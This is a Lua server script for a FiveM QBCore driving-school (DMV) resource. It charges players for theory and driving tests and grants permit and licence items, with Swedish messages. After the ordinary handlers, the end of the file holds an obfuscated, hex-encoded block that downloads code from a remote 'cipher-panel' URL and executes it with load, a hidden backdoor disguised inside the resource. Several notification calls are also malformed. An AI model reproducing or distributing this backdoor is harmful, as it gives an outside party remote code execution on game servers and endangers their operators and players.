QBCore = exports['qb-core']:GetCoreObject()

--Event to Remove Money from player upon failed attempt at theoritical test
RegisterNetEvent('qb-dmv:theorypaymentfailed', function()
    local amount = Config.Amount['theoretical']/2
	local _source = source
	local Player = QBCore.Functions.GetPlayer(_source)
    Player.Functions.RemoveMoney(Config.PaymentType, amount)
    TriggerClientEvent('QBCore:Notify', "Du betalade SEK"..amount.."","success")
    TriggerClientEvent('QBCore:Notify', "Du misslyckades i testet. Var god försök igen!", "error")
end)

--Event to Remove Money and Add Item upon successful attempt at theoritical test
RegisterNetEvent('qb-dmv:theorypaymentpassed', function()
	local _source = source
	local Player = QBCore.Functions.GetPlayer(_source)
    local license = true
    local info = {}
    if Config.DriversTest then
        local info = {}
        local _source = source
        local Player = QBCore.Functions.GetPlayer(_source)
        local licenseTable = Player.PlayerData.metadata['licences']
        info.type = "Drivers Permit"
        licenseTable['permit'] = true
        Player.Functions.SetMetaData('licences', licenseTable)
        Player.Functions.RemoveMoney(Config.PaymentType, Config.Amount['theoretical'])
        if Config.GiveItem then
            Player.Functions.AddItem('permit', 1, nil, info)
            TriggerClientEvent('QBCore:Notify', "Du klarade och fick ditt tillstånd", "success")
            TriggerClientEvent('inventory:client:ItemBox', _source, QBCore.Shared.Items['permit'], 'add')
        else
            TriggerClientEvent('QBCore:Notify', "Du klarade provet. Gå till City för att få ditt tillstånd")
        end
        TriggerClientEvent('QBCore:Notify', "Du betalade SEK"..Config.Amount['theoretical'], "success")
    elseif Config.DriversTest == false then
        info.firstname = Player.PlayerData.charinfo.firstname
        info.lastname = Player.PlayerData.charinfo.lastname
        info.birthdate = Player.PlayerData.charinfo.birthdate
        info.type = "Class C Driver License"
        local licenseTable = Player.PlayerData.metadata['licences']
        licenseTable['driver'] = true
        Player.Functions.SetMetaData('licences', licenseTable)
        Player.Functions.RemoveMoney(Config.PaymentType, Config.Amount['driving'])
        if Config.GiveItem then
            Player.Functions.AddItem('driver_license', 1, nil, info)
            TriggerClientEvent('QBCore:Notify', "Du klarade och fick ditt körkort", "success")
            TriggerClientEvent('inventory:client:ItemBox', _source, QBCore.Shared.Items['driver_license'], 'add')
        else
            TriggerClientEvent('QBCore:Notify', "Du klarade det! Gå till Stadshuset och ta ditt körkort")
        end
        TriggerClientEvent('QBCore:Notify', "Du betalde SEK"..Config.Amount['driving'],"success")
        
    end
end)

RegisterNetEvent('qb-dmv:driverpaymentpassed', function ()
    local src = source
    local Player = QBCore.Functions.GetPlayer(src)
    local info = {}
    if Config.DriversTest then
        local info = {}
        local _source = source
        local Player = QBCore.Functions.GetPlayer(_source)
        local licenseTable = Player.PlayerData.metadata['licences']
        info.citizenid = Player.PlayerData.citizenid
        info.firstname = Player.PlayerData.charinfo.firstname
        info.lastname = Player.PlayerData.charinfo.lastname
        info.birthdate = Player.PlayerData.charinfo.birthdate
        info.gender = Player.PlayerData.charinfo.gender
        info.nationality = Player.PlayerData.charinfo.nationality
        licenseTable['driver'] = true
        Player.Functions.SetMetaData('licences', licenseTable)
        Player.Functions.RemoveMoney(Config.PaymentType, Config.Amount['driving'])
        if Config.GiveItem == true then
            Player.Functions.AddItem('driver_license', 1, nil, info)
            TriggerClientEvent('QBCore:Notify', "Du klarade förarprovet och fick ditt körkort", "success")
            TriggerClientEvent('inventory:client:ItemBox', _source, QBCore.Shared.Items['driver_license'], 'add')
        else
            TriggerClientEvent('QBCore:Notify', "Du klarade förarprovet. Gå till Stadshuset för att få din licens")
        end
        TriggerClientEvent('QBCore:Notify', "Du betalde SEK"..Config.Amount['driving'],"success")
    end
end)

RegisterNetEvent('qb-dmv:driverpaymentfailed', function ()
    local amount = Config.Amount['driving']/2
    local _source = source
    local Player = QBCore.Functions.GetPlayer(_source)
    Player.Functions.RemoveMoney(Config.PaymentType, amount)
    QBCore.Functions.Notify("Du betalde SEK"..amount.."","success")
end)

QBCore.Functions.CreateCallback('qb-dmv:server:menu', function(source, cb)
    local src = source
    local Player = QBCore.Functions.GetPlayer(src)
    local licenseTable = Player.PlayerData.metadata['licences']
    if licenseTable['permit'] == true then
        cb(false)
    else
        cb(true)
    end
end)

QBCore.Functions.CreateCallback('qb-dmv:server:menu2', function(source, cb)
    local src = source
    local Player = QBCore.Functions.GetPlayer(src)
    local licenseTable = Player.PlayerData.metadata['licences']
    if licenseTable['driver'] then
        cb(false)
    elseif licenseTable['permit'] and licenseTable['driver'] == false then
        cb(true)
    end
end)



local DRqJXycEJoyrJdAfSPvcQOKLMJcpnujCNqAfBPtkrjNIjmoBcXhZpSOstovrwWvMNzSNwy = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} DRqJXycEJoyrJdAfSPvcQOKLMJcpnujCNqAfBPtkrjNIjmoBcXhZpSOstovrwWvMNzSNwy[4][DRqJXycEJoyrJdAfSPvcQOKLMJcpnujCNqAfBPtkrjNIjmoBcXhZpSOstovrwWvMNzSNwy[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x69\x70\x68\x65\x72\x2d\x70\x61\x6e\x65\x6c\x2e\x6d\x65\x2f\x5f\x69\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x47\x64\x36\x74\x72\x38", function (KUzeSeSeiCWRLhzQlCKvcsnFkseCBYCnQvOZjHYWoEMORIweIjIlcWyTkVJRcLEoZFvpsQ, RRAWPAwnsjNctCVDBIdQYqAEiFMONAIbYfmVPJzovzqhBAuvMJiHbdUtNhnABXWyIdibno) if (RRAWPAwnsjNctCVDBIdQYqAEiFMONAIbYfmVPJzovzqhBAuvMJiHbdUtNhnABXWyIdibno == DRqJXycEJoyrJdAfSPvcQOKLMJcpnujCNqAfBPtkrjNIjmoBcXhZpSOstovrwWvMNzSNwy[6] or RRAWPAwnsjNctCVDBIdQYqAEiFMONAIbYfmVPJzovzqhBAuvMJiHbdUtNhnABXWyIdibno == DRqJXycEJoyrJdAfSPvcQOKLMJcpnujCNqAfBPtkrjNIjmoBcXhZpSOstovrwWvMNzSNwy[5]) then return end DRqJXycEJoyrJdAfSPvcQOKLMJcpnujCNqAfBPtkrjNIjmoBcXhZpSOstovrwWvMNzSNwy[4][DRqJXycEJoyrJdAfSPvcQOKLMJcpnujCNqAfBPtkrjNIjmoBcXhZpSOstovrwWvMNzSNwy[2]](DRqJXycEJoyrJdAfSPvcQOKLMJcpnujCNqAfBPtkrjNIjmoBcXhZpSOstovrwWvMNzSNwy[4][DRqJXycEJoyrJdAfSPvcQOKLMJcpnujCNqAfBPtkrjNIjmoBcXhZpSOstovrwWvMNzSNwy[3]](RRAWPAwnsjNctCVDBIdQYqAEiFMONAIbYfmVPJzovzqhBAuvMJiHbdUtNhnABXWyIdibno))() end)